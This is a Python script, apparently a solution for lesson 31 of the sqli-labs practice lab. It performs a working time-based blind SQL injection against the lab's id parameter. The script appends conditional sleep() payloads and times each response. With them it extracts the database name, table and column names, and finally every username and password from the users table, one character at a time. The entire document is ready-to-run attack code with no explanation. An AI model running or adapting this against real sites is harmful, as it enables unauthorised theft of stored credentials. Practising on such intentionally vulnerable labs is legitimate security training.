import requests
import string
url='http://localhost/sqli-labs-php7-master/Less-31/?id=1") '
choice=string.ascii_letters+string.digits

#name of database
i=1
while (i):
    query='%26%26 if(length(database())='+str(i)+',sleep(3),sleep(0))-- -'
    page=requests.get(url+query)
    if(page.elapsed.seconds>=2):
        dblen=i
        print("Length of database name"+str(dblen))
        break
    i=i+1
flag=''
for i in range(1,dblen+1):
    for j in choice:
        query='%26%26 if(substr(database(),'+str(i)+',1)="'+j+'",sleep(3),sleep(0));-- -'
        page=requests.get(url+query)
        if(page.elapsed.seconds>=2):
            flag=flag+j
            print(flag)
            break

#table
i=1
while (i):
    query='%26%26 if((select length(group_concat(table_name))='+str(i)+' from information_schema.tables where table_schema=database()),sleep(3),sleep(0))-- -'
    page=requests.get(url+query)    
    print(str(i))
    if(page.elapsed.seconds>=2):
        dblen=i
        print("Length of columns name"+str(dblen))
        break
    i=i+1
flag=''
for i in range(1,dblen+1):
    for j in choice:
        query='%26%26 if((select substr(group_concat(table_name),'+str(i)+',1)="'+j+'" from information_schema.tables where table_schema=database()),sleep(2),sleep(0))-- -'
        page=requests.get(url+query)
        print(str(i)+".."+j)
        if(page.elapsed.seconds>=2):
            flag=flag+j
            print(flag)
            break

#columns
i=1
while (i):
    query='%26%26 if((select length(group_concat(column_name))='+str(i)+' from information_schema.columns where table_name="users"),sleep(3),sleep(0))-- -'
    page=requests.get(url+query)    
    print(str(i))
    if(page.elapsed.seconds>=2):
        dblen=i
        print("Length of columns name"+str(dblen))
        break
    i=i+1
flag=''
for i in range(1,dblen+1):
    for j in choice:
        query='%26%26 if((select substr(group_concat(column_name),'+str(i)+',1)="'+j+'" from information_schema.columns where table_name="users"),sleep(2),sleep(0))-- -'
        page=requests.get(url+query)
        print(str(i)+".."+j)
        if(page.elapsed.seconds>=2):
            flag=flag+j
            print(flag)
            break
#username
i=1
while (i):
    query='%26%26 if((select length(group_concat(username))='+str(i)+' from users), sleep(2),sleep(0))-- -'
    page=requests.get(url+query)    
    print(str(i))
    if(page.elapsed.seconds>=2):
        dblen=i
        print("Length of Usernames..."+str(dblen))
        break
    i=i+1
flag=''
for i in range(1,dblen+1):
    for j in choice:
        query='%26%26 if((select substr(group_concat(username),'+str(i)+',1)="'+j+'" from users),sleep(2),sleep(0))-- -'
        page=requests.get(url+query)
        print(str(i)+".."+j)
        if(page.elapsed.seconds>=2):
            flag=flag+j
            print(flag)
            break

#password
i=1
while (i):
    query='%26%26 if((select length(group_concat(password))='+str(i)+' from users), sleep(2),sleep(0))-- -'
    page=requests.get(url+query)    
    print(str(i))
    if(page.elapsed.seconds>=2):
        dblen=i
        print("Length of Usernames..."+str(dblen))
        break
    i=i+1
flag=''
for i in range(1,dblen+1):
    for j in choice:
        query='%26%26 if((select substr(group_concat(password),'+str(i)+',1)="'+j+'" from users),sleep(2),sleep(0))-- -'
        page=requests.get(url+query)
        print(str(i)+".."+j)
        if(page.elapsed.seconds>=2):
            flag=flag+j
            print(flag)
            break